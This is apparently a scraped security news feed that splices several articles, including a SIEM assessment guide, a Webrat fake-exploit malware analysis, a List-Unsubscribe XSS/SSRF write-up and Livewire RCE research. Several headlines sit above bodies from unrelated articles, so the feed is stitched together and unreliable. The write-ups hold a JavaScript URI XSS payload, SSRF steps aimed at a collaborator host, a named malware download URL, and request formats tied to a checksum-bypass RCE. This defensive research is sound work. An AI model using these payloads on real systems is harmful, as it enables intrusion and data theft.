and the unverified one, reducing the downsides of the verification leveraging testing.I would like to state it once more for everyone:I see the appeal, I like the idea, I trust the researchers building these systems, but I don't love the overarching promises. This blog post
is my attempt at building a reasonable middle ground by laying out the goods, and the bads, and make my closing
remarks by reiterating the position of testing in this space, and in the future.I believe random testing plays as important of a role as formal verification in the future of software engineering. We will not have magically formally verified systems
in many domains, but as autoformalization tools get better, we will have many, many more formal specifications. Random testing benefits from these formal specifications
in different ways than formal verification, but both have their places. Proof systems will be incomplete without the accompanying testing tools, and the testing tools
will be incomplete without proofs of correctness, it is only possible via some combination of verification and testing that we can achieve our ideals of the future of
software engineering, live in a world where bugs are considered anomalies instead of the norm, where correctness is a virtue, and the bugs in our systems are as old and
as forgotten as the diseases we learned to cure and put away.]]></content:encoded></item><item><title>Budding infosec pros and aspiring cyber crooks targeted with fake PoC exploits</title><link>https://www.helpnetsecurity.com/2025/12/23/fake-poc-exploits-webrat-malware/</link><author></author><category>security</category><pubDate>Tue, 23 Dec 2025 12:34:25 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">Latest Newsroom</source><content:encoded><![CDATA[Budding infosec pros and aspiring cyber crooks targeted with fake PoC exploits]]></content:encoded></item><item><title>Hacktivists claim near-total Spotify music scrape</title><link>https://www.malwarebytes.com/blog/news/2025/12/hacktivists-claim-near-total-spotify-music-scrape</link><author></author><category>threatintel</category><pubDate>Tue, 23 Dec 2025 12:28:20 +0000</pubDate><source url="https://www.malwarebytes.com/">Malwarebytes Labs</source><content:encoded><![CDATA[Hacktivist group Anna’s Archive claims to have scraped almost all of Spotify’s catalog and is now seeding it via BitTorrent, effectively turning a streaming platform into a roughly 300 TB pirate “preservation archive.”“A while ago, we discovered a way to scrape Spotify at scale. We saw a role for us here to build a music archive primarily aimed at preservation.”Spotify insists that the hacktivists obtained no user data. Still, the incident highlights how large‑scale scraping, digital rights management (DRM) circumvention, and weak abuse controls can turn major content platforms into high‑value targets.Anna’s Archive claims it obtained metadata for around 256 million tracks and audio files for roughly 86 million songs, totaling close to 300 TB. Reportedly, this represents about 99.9% of Spotify’s catalog and roughly 99.6% of all streams.Spotify says it has “identified and disabled the nefarious user accounts that engaged in unlawful scraping” and implemented new safeguards.From a security perspective, this incident is a textbook example of how scraping can escalate beyond “just metadata” into industrial‑scale content theft. By combining public APIs, token abuse, rate‑limit evasion, and DRM bypass techniques, attackers can extract protected content at scale. If you can create or compromise enough accounts and make them appear legitimate, you can chip away at content protections over time.The “Spotify scrape” will likely be framed as a copyright story. But from a security angle, it serves as a reminder: if a platform exposes content or metadata at scale, someone will eventually automate access to it, weaponize it, and redistribute it.And hiding behind violations of terms and conditions—which have never stopped criminals—is not effective security control.How does this affect you?There is currently no indication that passwords, payment details, or private playlists were exposed. This incident is purely about content and metadata, not user databases. That said, scammers may still claim otherwise. Be cautious of messages alleging your account data was compromised and asking for your login details.Some general Spotify security tips, to be on the safe side:If you have reused your Spotify password elsewhere or shared your credentials, consider changing your password for peace of mind.Regularly review active sessions on streaming services and revoke anything you do not recognize. Spotify does not offer per-device session management, but you can sign out of all devices via Account > Settings and privacy on the Spotify website.Avoid unofficial downloaders, converters, or “Spotify mods” that ask for your login or broad OAuth permissions. These tools often rely on the same kind of scraping infrastructure—or worse, function as credential-stealing malware.We don’t just report on threats – we help protect your social media]]></content:encoded></item><item><title>Critical n8n Automation Platform Vulnerability Enables RCE Attacks – 103,000+ Instances Exposed</title><link>https://cybersecuritynews.com/n8n-automation-platform-vulnerability/</link><author></author><category>security</category><pubDate>Tue, 23 Dec 2025 12:27:32 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">Latest Newsroom</source><content:encoded><![CDATA[

Due to its complexity, its effectiveness heavily depends on how it is configured and what data sources are connected to it. A one-time SIEM setup during implementation is not enough: both the organization’s infrastructure and attackers’ techniques evolve over time. To operate effectively, the SIEM system must reflect the current state of affairs.We provide customers with services to assess SIEM effectiveness, helping to identify issues and offering options for system optimization. In this article, we examine typical SIEM operational pitfalls and how to address them. For each case, we also include methods for independent verification.This material is based on an assessment of Kaspersky SIEM effectiveness; therefore, all specific examples, commands, and field names are taken from that solution. However, the assessment methodology, issues we identified, and ways to enhance system effectiveness can easily be extrapolated to any other SIEM.Methodology for assessing SIEM effectivenessThe primary audience for the effectiveness assessment report comprises the SIEM support and operation teams within an organization. The main goal is to analyze how well the usage of SIEM aligns with its objectives. Consequently, the scope of checks can vary depending on the stated goals. A standard assessment is conducted across the following areas:Composition and scope of connected data sourcesData flows from existing sourcesCorrectness of data normalizationDetection logic operabilitySIEM technical integration into SOC processesSOC analysts’ handling of alerts in the SIEMForwarding of alerts, security event data, and incident information to other systemsDeployment architecture and documentationAt the same time, these areas are examined not only in isolation but also in terms of their potential influence on one another. Here are a couple of examples illustrating this interdependence:Issues with detection logic due to incorrect data normalization. A correlation rule with the condition deviceCustomString1 not contains <string> triggers a large number of alerts. The detection logic itself is correct: the specific event and the specific field it targets should not generate a large volume of data matching the condition. Our review revealed the issue was in the data ingested by the SIEM, where incorrect encoding caused the string targeted by the rule to be transformed into a different one. Consequently, all events matched the condition and generated alerts.When analyzing coverage for a specific source type, we discovered that the SIEM was only monitoring 5% of all such sources deployed in the infrastructure. However, extending that coverage would increase system load and storage requirements. Therefore, besides connecting additional sources, it would be necessary to scale resources for specific modules (storage, collectors, or the correlator).The effectiveness assessment consists of several stages:Collect and analyze documentation, if available. This allows assessing SIEM objectives, implementation settings (ideally, the deployment settings at the time of the assessment), associated processes, and so on.Interview system engineers, analysts, and administrators. This allows assessing current tasks and the most pressing issues, as well as determining exactly how the SIEM is being operated. Interviews are typically broken down into two phases: an introductory interview, conducted at project start to gather general information, and a follow-up interview, conducted mid-project to discuss questions arising from the analysis of previously collected data.Gather information within the SIEM and then analyze it. This is the most extensive part of the assessment, during which Kaspersky experts are granted read-only access to the system or a part of it to collect factual data on its configuration, detection logic, data flows, and so on.The assessment produces a list of recommendations. Some of these can be implemented almost immediately, while others require more comprehensive changes driven by process optimization or a transition to a more structured approach to system use.Issues arising from SIEM operationsThe problems we identify during a SIEM effectiveness assessment can be divided into three groups:Performance issues, meaning operational errors in various system components. These problems are typically resolved by technical support, but to prevent them, it is worth periodically checking system health status.Efficiency issues – when the system functions normally but seemingly adds little value or is not used to its full potential. This is usually due to the customer using the system capabilities in a limited way, incorrectly, or not as intended by the developer.Detection issues – when the SIEM is operational and continuously evolving according to defined processes and approaches, but alerts are mostly false positives, and the system misses incidents. For the most part, these problems are related to the approach taken in developing detection logic.Key observations from the assessmentWhen building the inventory of event sources for a SIEM, we follow the principle of layered monitoring: the system should have information about all detectable stages of an attack. This principle enables the detection of attacks even if individual malicious actions have gone unnoticed, and allows for retrospective reconstruction of the full attack chain, starting from the attackers’ point of entry.: During effectiveness assessments, we frequently find that the inventory of connected source types is not updated when the infrastructure changes. In some cases, it has not been updated since the initial SIEM deployment, which limits incident detection capabilities. Consequently, certain types of sources remain completely invisible to the system.We have also encountered non-standard cases of incomplete source inventory. For example, an infrastructure contains hosts running both Windows and Linux, but monitoring is configured for only one family of operating systems.: To identify the problems described above, determine the list of source types connected to the SIEM and compare it against what actually exists in the infrastructure. Identifying the presence of specific systems in the infrastructure requires an audit. However, this task is one of the most critical for many areas of cybersecurity, and we recommend running it on a periodic basis.We have compiled a reference sheet of system types commonly found in most organizations. Depending on the organization type, infrastructure, and threat model, we may rearrange priorities. However, a good starting point is as follows:High Priority – sources associated with:
External services accessible from the internetEndpoint operating systemsInformation security toolsMedium Priority – sources associated with:
Remote access management within the perimeterInternal network communicationInfrastructure availabilityVirtualization and cloud solutionsLow Priority – sources associated with:
Applications used by various specialized teams (HR, Development, PR, IT, and so on)Monitoring data flow from sourcesRegardless of how good the detection logic is, it cannot function without telemetry from the data sources.: The SIEM core is not receiving events from specific sources or collectors. Based on all assessments conducted, the average proportion of collectors that are configured with sources but are not transmitting events is 38%. Correlation rules may exist for these sources, but they will, of course, never trigger. It is also important to remember that a single collector can serve hundreds of sources (such as workstations), so the loss of data flow from even one collector can mean losing monitoring visibility for a significant portion of the infrastructure.: The process of locating sources that are not transmitting data can be broken down into two components.Checking collector health. Find the status of collectors (see the support website for the steps to do this in Kaspersky SIEM) and identify those with a status of , , , and so on.Checking the event flow. In Kaspersky SIEM, this can be done by gathering statistics using the following query (counting the number of events received from each collector over a specific time period):SELECT count(ID), CollectorID, CollectorName FROM `events` GROUP BY CollectorID, CollectorName ORDER BY count(ID)
It is essential to specify an optimal time range for collecting these statistics. Too large a range can increase the load on the SIEM, while too small a range may provide inaccurate information for a one-time check – especially for sources that transmit telemetry relatively infrequently, say, once a week. Therefore, it is advisable to choose a smaller time window, such as 2–4 days, but run several queries for different periods in the past.Additionally, for a more comprehensive approach, it is recommended to use built-in functionality or custom logic implemented via correlation rules and lists to monitor event flow. This will help automate the process of detecting problems with sources.: The system is not receiving events from all sources of a particular type that exist in the infrastructure. For example, the company uses workstations and servers running Windows. During SIEM deployment, workstations are immediately connected for monitoring, while the server segment is postponed for one reason or another. As a result, the SIEM receives events from Windows systems, the flow is normalized, and correlation rules work, but an incident in the unmonitored server segment would go unnoticed.: Below are query variations that can be used to search for unconnected sources.SELECT count(distinct, DeviceAddress), DeviceVendor, DeviceProduct FROM  GROUP BY DeviceVendor, DeviceProduct ORDER BY count(ID)SELECT count(distinct, DeviceHostName), DeviceVendor, DeviceProduct FROM  GROUP BY DeviceVendor, DeviceProduct ORDER BY count(ID)We have split the query into two variations because, depending on the source and the DNS integration settings, some events may contain either a  or  field.These queries will help determine the number of unique data sources sending logs of a specific type. This count must be compared against the actual number of sources of that type, obtained from the system owners.Raw data can be useful for developing custom normalizers or for storing events not used in correlation that might be needed during incident investigation. However, careless use of this setting can cause significantly more harm than good.: Enabling the  option effectively doubles the event size in the database, as it stores two copies: the original and the normalized version. This is particularly critical for high-volume collectors receiving events from sources like NetFlow, DNS, firewalls, and others. It is worth noting that this option is typically used for testing a normalizer but is often forgotten and left enabled after its configuration is complete.: This option is applied at the normalizer level. Therefore, it is necessary to review all active normalizers and determine whether retaining raw data is required for their operation.As with the absence of events from sources, normalization issues lead to detection logic failing, as this logic relies on finding specific information in a specific event field.: Several issues related to normalization can be identified:The event flow is not being normalized at all.Events are only partially normalized – this is particularly relevant for custom, non-out-of-the-box normalizers.The normalizer being used only parses headers, such as , placing the entire event body into a single field, this field most often being .An outdated default normalizer is being used.: Identifying normalization issues is more challenging than spotting source problems due to the high volume of telemetry and variety of parsers. Here are several approaches to narrowing the search:First, check which normalizers supplied with the SIEM the organization uses and whether their versions are up to date. In our assessments, we frequently encounter auditd events being normalized by the outdated normalizer, Linux audit and iptables syslog v2 for Kaspersky SIEM. The new normalizer completely reworks and optimizes the normalization schema for events from this source.SELECT count(ID), DeviceProduct, DeviceVendor, CollectorName FROM `events` GROUP BY DeviceProduct, DeviceVendor, CollectorName ORDER BY count(ID)
This query gathers statistics on events from each collector, broken down by the DeviceVendor and DeviceProduct fields. While these fields are not mandatory, they are present in almost any normalization schema. Therefore, their complete absence or empty values may indicate normalization issues. We recommend including these fields when developing custom normalizers.To simplify the identification of normalization problems when developing custom normalizers, you can implement the following mechanism. For each successfully normalized event, add a Name field, populated from a constant or the event itself. For a final catch-all normalizer that processes all unparsed events, set the constant value: . This will later allow you to identify non-normalized events through a simple search on this field.Collected events alone are, in most cases, only useful for investigating an incident that has already been identified. For a SIEM to operate to its full potential, it requires detection logic to be developed to uncover probable security incidents.: The mean correlation rule coverage of sources, determined across all our assessments, is 43%. While this figure is only a ballpark figure – as different source types provide different information – to calculate it, we defined “coverage” as the presence of at least one correlation rule for a source. This means that for more than half of the connected sources, the SIEM is not actively detecting. Meanwhile, effort and SIEM resources are spent on connecting, maintaining, and configuring these sources. In some cases, this is formally justified, for instance, if logs are only needed for regulatory compliance. However, this is an exception rather than the rule.We do not recommend solving this problem by simply not connecting sources to the SIEM. On the contrary, sources should be connected, but this should be done concurrently with the development of corresponding detection logic. Otherwise, it can be forgotten or postponed indefinitely, while the source pointlessly consumes system resources.: This brings us back to auditing, a process that can be greatly aided by creating and maintaining a register of developed detection logic. Given that not every detection logic rule explicitly states the source type from which it expects telemetry, its description should be added to this register during the development phase.If descriptions of the correlation rules are not available, you can refer to the following:The name of the detection logic. With a standardized approach to naming correlation rules, the name can indicate the associated source or at least provide a brief description of what it detects.The use of fields within the rules, such as ,  (another argument for including these fields in the normalizer), , , , , and others. These can help identify the actual source.Excessive alerts generated by the detection logicOne criterion for correlation rules effectiveness is a low false positive rate.: Detection logic generates an abnormally high number of alerts that are physically impossible to process, regardless of the size of the SOC team.: First and foremost, detection logic should be tested during development and refined to achieve an acceptable false positive rate. However, even a well-tuned correlation rule can start producing excessive alerts due to changes in the event flow or connected infrastructure. To identify these rules, we recommend periodically running the following query:SELECT count(ID), Name FROM `events` WHERE Type = 3 GROUP BY Name ORDER BY count(ID)
In Kaspersky SIEM, a value of 3 in the Type field indicates a correlation event.Subsequently, for each identified rule with an anomalous alert count, verify the correctness of the logic it uses and the integrity of the event stream on which it triggered.Depending on the issue you identify, the solution may involve modifying the detection logic, adding exceptions (for example, it is often the case that 99% of the spam originates from just 1–5 specific objects, such as an IP address, a command parameter, or a URL), or adjusting event collection and normalization.SIEM integrations with other systems are generally a critical part of both event processing and alert enrichment. In at least one specific case, their presence directly impacts detection performance: integration with technical Threat Intelligence data or IoCs (indicators of compromise).A SIEM allows conveniently checking objects against various reputation databases or blocklists. Furthermore, there are numerous sources of this data that are ready to integrate natively with a SIEM or require minimal effort to incorporate.: There is no integration with TI data.: Generally, IoCs are integrated into a SIEM at the system configuration level during deployment or subsequent optimization. The use of TI within a SIEM can be implemented at various levels:At the data source level. Some sources, such as NGFWs, add this information to events involving relevant objects.At the SIEM native functionality level. For example, Kaspersky SIEM integrates with CyberTrace indicators, which add object reputation information at the moment of processing an event from a source.At the detection logic level. Information about IoCs is stored in various active lists, and correlation rules match objects against these to enrich the event.Furthermore, TI data does not appear in a SIEM out of thin air. It is either provided by external suppliers (commercially or in an open format) or is part of the built-in functionality of the security tools in use. For instance, various NGFW systems can additionally check the reputation of external IP addresses or domains that users are accessing. Therefore, the first step is to determine whether you are receiving information about indicators of compromise and in what form (whether external providers’ feeds have been integrated and/or the deployed security tools have this capability). It is worth noting that receiving TI data only at the security tool level does not always cover all types of IoCs.If data is being received in some form, the next step is to verify that the SIEM is utilizing it. For TI-related events coming from security tools, the SIEM needs a correlation rule developed to generate alerts. Thus, checking integration in this case involves determining the capabilities of the security tools, searching for the corresponding events in the SIEM, and identifying whether there is detection logic associated with these events. If events from the security tools are absent, the source audit configuration should be assessed to see if the telemetry type in question is being forwarded to the SIEM at all. If normalization is the issue, you should assess parsing accuracy and reconfigure the normalizer.If TI data comes from external providers, determine how it is processed within the organization. Is there a centralized system for aggregating and managing threat data (such as CyberTrace), or is the information stored in, say, CSV files?In the former case (there is a threat data aggregation and management system) you must check if it is integrated with the SIEM. For Kaspersky SIEM and CyberTrace, this integration is handled through the SIEM interface. Following this, SIEM event flows are directed to the threat data aggregation and management system, where matches are identified and alerts are generated, and then both are sent back to the SIEM. Therefore, checking the integration involves ensuring that all collectors receiving events that may contain IoCs are forwarding those events to the threat data aggregation and management system. We also recommend checking if the SIEM has a correlation rule that generates an alert based on matching detected objects with IoCs.In the latter case (threat information is stored in files), you must confirm that the SIEM has a collector and normalizer configured to load this data into the system as events. Also, verify that logic is configured for storing this data within the SIEM for use in correlation. This is typically done with the help of lists that contain the obtained IoCs. Finally, check if a correlation rule exists that compares the event flow against these IoC lists.As the examples illustrate, integration with TI in standard scenarios ultimately boils down to developing a final correlation rule that triggers an alert upon detecting a match with known IoCs. Given the variety of integration methods, creating and providing a universal out-of-the-box rule is difficult. Therefore, in most cases, to ensure IoCs are connected to the SIEM, you need to determine if the company has developed that rule (the existence of the rule) and if it has been correctly configured. If no correlation rule exists in the system, we recommend creating one based on the TI integration methods implemented in your infrastructure. If a rule does exist, its functionality must be verified: if there are no alerts from it, analyze its trigger conditions against the event data visible in the SIEM and adjust it accordingly.The SIEM is not kept up to dateFor a SIEM to run effectively, it must contain current data about the infrastructure it monitors and the threats it’s meant to detect. Both elements change over time: new systems and software, users, security policies, and processes are introduced into the infrastructure, while attackers develop new techniques and tools. It is safe to assume that a perfectly configured and deployed SIEM system will no longer be able to fully see the altered infrastructure or the new threats after five years of running without additional configuration. Therefore, practically all components – event collection, detection, additional integrations for contextual information, and exclusions – must be maintained and kept up to date.Furthermore, it is important to acknowledge that it is impossible to cover 100% of all threats. Continuous research into attacks, development of detection methods, and configuration of corresponding rules are a necessity. The SOC itself also evolves. As it reaches certain maturity levels, new growth opportunities open up for the team, requiring the utilization of new capabilities. The SIEM has not evolved since its initial deployment.: Compare the original statement of work or other deployment documentation against the current state of the system. If there have been no changes, or only minimal ones, it is highly likely that your SIEM has areas for growth and optimization. Any infrastructure is dynamic and requires continuous adaptation.Other issues with SIEM implementation and operationIn this article, we have outlined the primary problems we identify during SIEM effectiveness assessments, but this list is not exhaustive. We also frequently encounter:Mismatch between license capacity and actual SIEM load. The problem is almost always the absence of events from sources, rather than an incorrect initial assessment of the organization’s needs.Lack of user rights management within the system (for example, every user is assigned the administrator role).Poor organization of customizable SIEM resources (rules, normalizers, filters, and so on). Examples include chaotic naming conventions, non-optimal grouping, and obsolete or test content intermixed with active content. We have encountered confusing resource names like [dev] test_Add user to admin group_final2.Use of out-of-the-box resources without adaptation to the organization’s infrastructure. To maximize a SIEM’s value, it is essential at a minimum to populate exception lists and specify infrastructure parameters: lists of administrators and critical services and hosts.Disabled native integrations with external systems, such as LDAP, DNS, and GeoIP.Generally, most issues with SIEM effectiveness stem from the natural degradation (accumulation of errors) of the processes implemented within the system. Therefore, in most cases, maintaining effectiveness involves structuring these processes, monitoring the quality of SIEM engagement at all stages (source onboarding, correlation rule development, normalization, and so on), and conducting regular reviews of all system components and resources.A SIEM is a powerful tool for monitoring and detecting threats, capable of identifying attacks at various stages across nearly any point in an organization’s infrastructure. However, if improperly configured and operated, it can become ineffective or even useless while still consuming significant resources. Therefore, it is crucial to periodically audit the SIEM’s components, settings, detection rules, and data sources.If a SOC is overloaded or otherwise unable to independently identify operational issues with its SIEM, we offer Kaspersky SIEM platform users a service to assess its operation. Following the assessment, we provide a list of recommendations to address the issues we identify. That being said, it is important to clarify that these are not strict, prescriptive instructions, but rather highlight areas that warrant attention and analysis to improve the product’s performance, enhance threat detection accuracy, and enable more efficient SIEM utilization.]]></content:encoded></item><item><title>PoC Exploit Released HPE OneView Vulnerability that Enables Remote Code Execution</title><link>https://cybersecuritynews.com/poc-exploit-hpe-oneview-vulnerability/</link><author></author><category>security</category><pubDate>Tue, 23 Dec 2025 11:38:56 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">Latest Newsroom</source><content:encoded><![CDATA[

It allows email clients to provide an easy way for end-users to unsubscribe from mailing lists.This post discusses how this header can be abused to perform Cross-Site Scripting (XSS) and Server-Side Request Forgery (SSRF) attacks in certain scenarios.
Real-world examples involving  () and  are provided to illustrate the risks.The  SMTP header is defined in  and allows email clients to provide an easy way for end-users to unsubscribe from mailing lists.The List-Unsubscribe field describes the command (preferably using mail) to directly unsubscribe the user (removing them from the list).

In theory, that’s it. Does not sound too exciting for now, right?Easy to miss, but the most interesting example was the very last one, which includes both an HTTP URI and a mailto link. Can we simply add arbitrary  URIs here? What about other schemes?Many modern email clients and webmail applications have implemented support for this header to improve user experience. For example, when an email includes a  header, the client may render a button or link that allows the user to unsubscribe with a single click. This is especially interesting in the context of webmail applications, where the unsubscription process can be initiated directly from the web interface. Anchor tags, URIs, … JavaScript URIs? The possibilities are endless.Alternatively, some webmail applications send the unsubscription request server-side when the end-user clicks the unsubscribe button. This can lead to Server-Side Request Forgery (SSRF) vulnerabilities if the application does not properly validate the provided URI.Stored XSS via JavaScript URI: Horde Webmail (CVE-2025-68673)A real-world example of a Stored Cross-Site Scripting (XSS) vulnerability was identified in Horde (, used with  through ). When an email includes a  SMTP header, a button is rendered within the message detail view that allows users to unsubscribe directly from mailing lists.A malicious actor can exploit this behavior by including a JavaScript URI (), which allows them to execute JavaScript in the origin of the Horde installation when an end-user clicks the link:The following steps can be taken to reproduce the issue:Send an email that includes the JavaScript URI <javascript://lhq.at/%0aconfirm(document.domain)> within the .

The following Python script expects that you have DKIM set up and have your private key at hand:The following steps can be taken to reproduce the SSRF with external collaborator:Set up DKIM for your domain and update ,  and .Adjust  and .Use the account you will use within the Nextcloud instance as the .Use your own collaborator instance in 'List-Unsubscribe': '<http://abcdef.oastify.com>'.Send the email via .Browse the received email and click .The general recommendation is as simple and self-explanatory as it gets: Consider all input to the application as potentially dangerous, especially when interpreted as a URI/URL.When implementing support for the  SMTP header, webmail applications should:Validate and sanitize the provided URIs to prevent XSS attacks. For example, disallow  URIs. For further guidance, refer to OWASP XSS Prevention Cheat Sheet.Implement proper server-side validation to prevent SSRF attacks. This may include restricting the allowed domains or IP ranges that can be accessed via the unsubscription links. For further guidance, refer to OWASP SSRF Prevention Cheat Sheet.Log unsubscription requests for auditing and monitoring purposes.This post once again showcases that old standards and protocols can still harbor interesting security implications when implemented in modern applications. The  SMTP header, while designed to enhance user experience, can be exploited for XSS and SSRF attacks if not handled properly.If your bug bounty or pentest target includes a webmail application, consider testing the  header for potential vulnerabilities. You might be surprised by what you find!Generally speaking, this research highlights the importance of reading and understanding relevant RFCs and standards when assessing applications that implement them. Even seemingly benign features can introduce significant security risks if not implemented with care.You can directly tweet about this post using this link. 🤓]]></content:encoded></item><item><title>A brush with online fraud: What are brushing scams and how do I stay safe?</title><link>https://www.welivesecurity.com/en/scams/brush-online-fraud-what-are-brushing-scams-how-do-i-stay-safe/</link><author></author><category>threatintel</category><pubDate>Tue, 23 Dec 2025 10:00:00 +0000</pubDate><source url="https://www.welivesecurity.com/">ESET WeLiveSecurity</source><content:encoded><![CDATA[Have you ever received a package you never ordered?

Initially, the Trojan targeted regular users by disguising itself as cheats for popular games like Rust, Counter-Strike, and Roblox, or as cracked software. In September, the attackers decided to widen their net: alongside gamers and users of pirated software, they are now targeting inexperienced professionals and students in the information security field.Distribution and the malicious sampleIn October, we uncovered a campaign that had been distributing Webrat via GitHub repositories since at least September. To lure in victims, the attackers leveraged vulnerabilities frequently mentioned in security advisories and industry news. Specifically, they disguised their malware as exploits for the following vulnerabilities with high CVSSv3 scores:In the Webrat campaign, the attackers bait their traps with both vulnerabilities lacking a working exploit and those which already have one. To build trust, they carefully prepared the repositories, incorporating detailed vulnerability information into the descriptions. The information is presented in the form of structured sections, which include:Overview with general information about the vulnerability and its potential consequencesSpecifications of systems susceptible to the exploitGuide for downloading and installing the exploitGuide for using the exploitSteps to mitigate the risks associated with the vulnerabilityContents of the repositoryIn all the repositories we investigated, the descriptions share a similar structure, characteristic of AI-generated vulnerability reports, and offer nearly identical risk mitigation advice, with only minor variations in wording. This strongly suggests that the text was machine-generated.The Download Exploit ZIP link in the Download & Install section leads to a password-protected archive hosted in the same repository. The password is hidden within the name of a file inside the archive.The archive downloaded from the repository includes four files:pass – 8511: an empty file, whose name contains the password for the archive.payload.dll: a decoy, which is a corrupted PE file. It contains no useful information and performs no actions, serving only to divert attention from the primary malicious file.rasmanesc.exe (note: file names may vary): the primary malicious file (MD5 61b1fc6ab327e6d3ff5fd3e82b430315), which performs the following actions:
Escalate its privileges to the administrator level (T1134.002).Disable Windows Defender (T1562.001) to avoid detection.Fetch from a hardcoded URL (ezc5510min.temp[.]swtest[.]ru in our example) a sample of the Webrat family and execute it (T1608.001).start_exp.bat: a file containing a single command: start rasmanesc.exe, which further increases the likelihood of the user executing the primary malicious file.The execution flow and capabilities of rasmanesc.exeWebrat is a backdoor that allows the attackers to control the infected system. Furthermore, it can steal data from cryptocurrency wallets, Telegram, Discord and Steam accounts, while also performing spyware functions such as screen recording, surveillance via a webcam and microphone, and keylogging. The version of Webrat discovered in this campaign is no different from those documented previously.Previously, Webrat spread alongside game cheats, software cracks, and patches for legitimate applications. In this campaign, however, the Trojan disguises itself as exploits and PoCs. This suggests that the threat actor is attempting to infect information security specialists and other users interested in this topic. It bears mentioning that any competent security professional analyzes exploits and other malware within a controlled, isolated environment, which has no access to sensitive data, physical webcams, or microphones. Furthermore, an experienced researcher would easily recognize Webrat, as it’s well-documented and the current version is no different from previous ones. Therefore, we believe the bait is aimed at students and inexperienced security professionals.The threat actor behind Webrat is now disguising the backdoor not only as game cheats and cracked software, but also as exploits and PoCs. This indicates they are targeting researchers who frequently rely on open sources to find and analyze code related to new vulnerabilities.However, Webrat itself has not changed significantly from past campaigns. These attacks clearly target users who would run the “exploit” directly on their machines — bypassing basic safety protocols. This serves as a reminder that cybersecurity professionals, especially inexperienced researchers and students, must remain vigilant when handling exploits and any potentially malicious files. To prevent potential damage to work and personal devices containing sensitive information, we recommend analyzing these exploits and files within isolated environments like virtual machines or sandboxes.We also recommend exercising general caution when working with code from open sources, always using reliable security solutions, and never adding software to exclusions without a justified reason.Kaspersky solutions effectively detect this threat with the following verdicts:HEUR:Trojan.Python.Agent.genHEUR:Trojan-PSW.Win64.Agent.genHEUR:Trojan-Banker.Win32.Agent.genHEUR:Trojan-PSW.Win32.Coins.genHEUR:Trojan-Downloader.Win32.Agent.gen]]></content:encoded></item><item><title>Default to Deny: Why Network Security Is Shifting to &quot;Zero Trust&quot; ⛔ Ep. 167 ThreatLocker</title><link>https://www.youtube.com/watch?v=aP8j9dgpAs0</link><author>Jack Rhysider</author><category>security</category><enclosure url="https://www.youtube.com/v/aP8j9dgpAs0?version=3" length="" type=""/><pubDate>Tue, 23 Dec 2025 08:00:01 +0000</pubDate><source url="https://www.youtube.com/channel/UCMIqrmh2lMdzhlCPK5ahsAg">Jack Rhysider</source><content:encoded><![CDATA[A manufacturer gets hit with ransomware.

However, this mechanism comes with a critical vulnerability: a dangerous unmarshalling process can be exploited as long as an attacker is in possession of the APP\_KEY of the application. By crafting malicious payloads, attackers can manipulate Livewire’s hydration process to execute arbitrary code, from simple function calls to stealthy remote command execution.

Finally, our research uncovered a pre-authenticated remote code execution vulnerability in Livewire, exploitable even without knowledge of the application’s APP\_KEY. By analyzing Livewire’s recursive hydration mechanism, we found that attackers could inject malicious synthesizers through the updates field in Livewire requests, leveraging PHP’s loose typing and nested array handling. This technique bypasses checksum validation, allowing arbitrary object instantiation and leading to full system compromise.

## Introduction

Livewire has rapidly become one of the most popular full-stack frameworks for Laravel, empowering developers to build dynamic, real-time interfaces with minimal JavaScript. As of 2025, Livewire is used in over **30% of new Laravel projects**, according to community surveys and GitHub trends, making it a cornerstone of modern Laravel development.

According to builtwith, there are currently more than 130K public instances of application based on Livewire.

Livewire uses the concepts of hydration and dehydration to manage component states. When a component is dehydrated, its state is saved and sent to the frontend with a checksum. Upon rehydration, the server verifies the checksum before restoring the component's state. This ensures that the component's state has not been altered during transit.

## Livewire hydration mechanism

### Example of a Livewire update chain

First, let's see how Livewire is integrated on an actual Laravel project to better understand its purpose.

Consider the following simple quickstart example: a basic component that increments or decrements a counter. A Livewire component can be setup with only three files:

- A component stored in `app/Livewire/`:

```
// app/Livewire/Counter.php count++; } public function decrement() { $this->count--; } public function render() { return view('livewire.counter'); } }
```

- A route pointing to this component

```
// routes/web.php  @if($count)  @endif  
```

When a user triggers the increment action on the frontend, a POST request is sent to the server to update the component state.

The request looks like this:

```
POST /livewire/update HTTP/1.1 Host: livewire.local [...] { "_token":"jMEN2kTQRrwSA5CgH5y8WWqbCpdb4Lx4iBznnlFD", "components":[ { "snapshot":"{\"data\":{\"count\":3},\"memo\":{\"id\":\"Y6a883cdUFy82whZ10JW\",\"name\":\"counter\",\"path\":\"counter\",\"method\":\"GET\",\"children\":[],\"scripts\":[],\"assets\":[],\"errors\":[],\"locale\":\"en\"},\"checksum\":\"f56c273c0e4a3eaa5d7fdea9e7142c42d0e1128a8aee35e9546baffaa41870ac\"}", "updates":{}, "calls":[ { "path":"", "method":"increment", "params":[] } ] } ] }
```

In this request, two fields are particularly important. First, the `components->snapshot` field contains all the serialized information needed to restore the component’s state on the server side, including the properties and their values. Second, the `components->calls` field defines the list of methods that need to be called on the component, along with any associated parameters.

```
{ "data":{ "count":3 }, "memo":{ "id":"Y6a883cdUFy82whZ10JW", "name":"counter", "path":"counter", "method":"GET", "children":[], "scripts":[], "assets":[], "errors":[], "locale":"en" }, "checksum":"f56c273c0e4a3eaa5d7fdea9e7142c42d0e1128a8aee35e9546baffaa41870ac" }
```

`components->snapshot->data` stores the state of the component. While properties with simple types are sent as raw JSON (for instance, `count` in the previous example), complex types can also be serialized using what Livewire calls Synthetizers.

### Livewire synthesizers

Synthesizers provide a mechanism to define how these custom types should be JSON serialized (dehydrated) and JSON deserialized (hydrated) when sent between the client and server. This ensures that the state of these properties is correctly maintained across requests. By implementing custom Synthesizers, developers can extend Livewire's functionality to recognize and manage various property types used in their applications, enhancing the flexibility and capability of Livewire components.

To be considered a synthesizer, a check is made by Livewire on each payload element using the `isSyntheticTuple` function.

```
1  $child) { 10 $value[$key] = $hydrateChild($key, $child); 11 } 12 return new $meta['class']($value); 13 } 14 }
```

The class defines a static `$key` set to `'clctn'`, which serves as an identifier. This key is used internally by Livewire to associate serialized data with the `CollectionSynth` class during the hydration phase.

When the `hydrate` method is called, it receives a `$value`, which represents the serialized collection data, a `$meta` array containing metadata (such as the name of the original class), and a `$hydrateChild` callback used to individually process each element of the collection. The `$value` is first iterated over, and each item is passed through the `$hydrateChild` function to ensure nested, or complex types are properly rehydrated. Once all elements are processed, a new instance of the original collection class is created using the reconstructed array.

